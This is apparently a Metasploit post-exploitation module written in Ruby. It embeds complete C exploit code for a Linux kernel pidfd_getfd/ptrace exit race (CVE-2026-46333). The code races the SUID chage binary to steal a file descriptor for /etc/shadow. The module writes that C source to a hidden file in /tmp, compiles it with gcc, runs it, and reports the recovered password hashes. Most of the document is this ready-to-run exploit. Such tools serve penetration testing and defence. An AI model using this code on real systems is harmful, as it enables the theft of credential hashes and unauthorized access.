##
# This module requires Metasploit Framework
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Kernel __ptrace_may_access() Exit Race chage File Disclosure',
        'Description' => %q{
          This module exploits a race condition in the Linux kernel
          do_exit() teardown path affecting __ptrace_may_access().

          During process termination, privileged file descriptors may
          remain accessible through pidfd_getfd() after task->mm becomes
          NULL, allowing sensitive file disclosure from privileged SUID
          binaries such as chage.

          This module targets chage to disclose /etc/shadow.

          This module performs information disclosure only and does not
          create a new session.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          '0xdeadbeefnetwork', # Original POC author
          'bhaskarbhar' # Metasploit module author
        ],
        'References' => [
          [ 'CVE', '2026-46333' ],
          [ 'URL', 'https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn' ]
        ],
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DisclosureDate' => '2026-05-14',
        'Notes' => {
          'AKA' => [ 'ssh-keysign-pwn' ],
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptString.new(
        'WRITABLE_DIR',
        [ true, 'Writable directory for exploit compilation', '/tmp' ]
      ),

      OptInt.new(
        'RACE_ROUNDS',
        [ true, 'Number of race attempts', 500 ]
      )
    ])
  end

  def check
    version = kernel_release.to_s.strip

    if version.nil? || version.empty?
      return Exploit::CheckCode::Unknown(
        'Unable to determine kernel version'
      )
    end

    vprint_status("Detected kernel version: #{version}")

    unless command_exists?('gcc')
      return Exploit::CheckCode::Unknown(
        'gcc is missing; exploit cannot compile'
      )
    end

    unless file?('/usr/bin/chage')
      return Exploit::CheckCode::Unknown(
        'chage target binary not present'
      )
    end

    unless setuid?('/usr/bin/chage') || stat('/usr/bin/chage').setgid?
      return Exploit::CheckCode::Unknown(
        'chage does not appear to have SGID/SUID permissions'
      )
    end

    ptrace_scope = yama_ptrace_scope

    if ptrace_scope > 0
      vprint_warning(
        "ptrace_scope=#{ptrace_scope} may reduce exploit reliability"
      )
    end

    clean_version = version
                    .split('-')
                    .first
                    .split('+')
                    .first

    kernel = Rex::Version.new(clean_version)

    if kernel < Rex::Version.new('5.6.0')
      return Exploit::CheckCode::Safe(
        "Kernel #{version} is older than vulnerable range"
      )
    end

    if kernel >= Rex::Version.new('6.15.0')
      return Exploit::CheckCode::Detected(
        "Kernel #{version} may contain vendor backports or fixes"
      )
    end

    Exploit::CheckCode::Appears(
      "Kernel #{version} appears vulnerable to CVE-2026-46333"
    )
  end

  def exploit_source
    <<~EOF
      #define _GNU_SOURCE

      #include <stdio.h>
      #include <stdlib.h>
      #include <string.h>
      #include <unistd.h>
      #include <errno.h>
      #include <fcntl.h>
      #include <signal.h>
      #include <sys/syscall.h>
      #include <sys/wait.h>

      #ifndef __NR_pidfd_open
      #define __NR_pidfd_open 434
      #endif

      #ifndef __NR_pidfd_getfd
      #define __NR_pidfd_getfd 438
      #endif

      int main(int argc, char **argv)
      {
          int rounds = 500;

          if (argc > 1) {
              rounds = atoi(argv[1]);
          }

          for (int round = 0; round < rounds; round++) {

              pid_t child = fork();

              if (child == 0) {

                  int dn = open("/dev/null", O_RDWR);

                  dup2(dn, 1);
                  dup2(dn, 2);

                  execl("/usr/bin/chage",
                        "chage",
                        "-l",
                        "root",
                        (char *)NULL);

                  _exit(127);
              }

              int pidfd = syscall(__NR_pidfd_open, child, 0);

              if (pidfd < 0) {
                  waitpid(child, NULL, 0);
                  continue;
              }

              int stolen = -1;

              for (int attempt = 0;
                   attempt < 30000 && stolen < 0;
                   attempt++) {

                  for (int fd = 3; fd < 32; fd++) {

                      int s = syscall(__NR_pidfd_getfd,
                                      pidfd,
                                      fd,
                                      0);

                      if (s < 0) {
                          continue;
                      }

                      char path[256] = {0};
                      char linkpath[64];

                      snprintf(linkpath,
                               sizeof(linkpath),
                               "/proc/self/fd/%d",
                               s);

                      ssize_t n = readlink(linkpath,
                                           path,
                                           sizeof(path) - 1);

                      if (n > 0) {
                          path[n] = 0;
                      }

                      if (strstr(path, "/etc/shadow")) {

                          stolen = s;

                          fprintf(stderr,
                                  "[+] Stole fd %d -> %s\\n",
                                  fd,
                                  path);

                          break;
                      }

                      close(s);
                  }
              }

              if (stolen >= 0) {

                  char buf[8192];

                  lseek(stolen, 0, SEEK_SET);

                  ssize_t n;

                  while ((n = read(stolen,
                                   buf,
                                   sizeof(buf))) > 0) {

                      fwrite(buf, 1, n, stdout);
                  }

                  close(stolen);
                  close(pidfd);

                  waitpid(child, NULL, 0);

                  return 0;
              }

              close(pidfd);

              waitpid(child, NULL, 0);
          }

          fprintf(stderr,
                  "[-] Failed after all race attempts\\n");

          return 1;
      }
    EOF
  end

  def run
    checkcode = check

    if checkcode == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable,
                'Target does not appear vulnerable')
    end

    unless directory?(datastore['WRITABLE_DIR'])
      fail_with(Failure::BadConfig,
                'Writable directory does not exist')
    end

    base = ".#{Rex::Text.rand_text_alpha(6)}"

    c_path = "#{datastore['WRITABLE_DIR']}/#{base}.c"
    bin_path = "#{datastore['WRITABLE_DIR']}/#{base}"

    print_status("Writing exploit source to #{c_path}")

    write_file(c_path, exploit_source)

    register_file_for_cleanup(c_path)

    print_status('Compiling exploit payload')

    compile = create_process('gcc', args: ['-O2', c_path, '-o', bin_path], time_out: 120)

    vprint_status(compile) unless compile.nil? || compile.empty?

    unless file?(bin_path)
      fail_with(Failure::Unknown,
                'Exploit compilation failed')
    end

    chmod(bin_path, 0o700)

    register_file_for_cleanup(bin_path)

    print_status(
      "Launching race with #{datastore['RACE_ROUNDS']} attempts"
    )

    output = create_process(bin_path, args: [datastore['RACE_ROUNDS'].to_s], time_out: 30)

    if output.nil? || output.empty?
      fail_with(Failure::Unknown,
                'Exploit returned no output')
    end

    if output.include?('$')

      print_good('Successfully disclosed /etc/shadow')

      passwd_file = read_file('/etc/passwd')
      report_linux_hashdump(passwd_file, output)

      print_line
      print_line(output)

    else

      print_error(
        'Race attempts completed but no matching /etc/shadow file descriptor was recovered'
      )

      vprint_status(output)
    end
  end

end
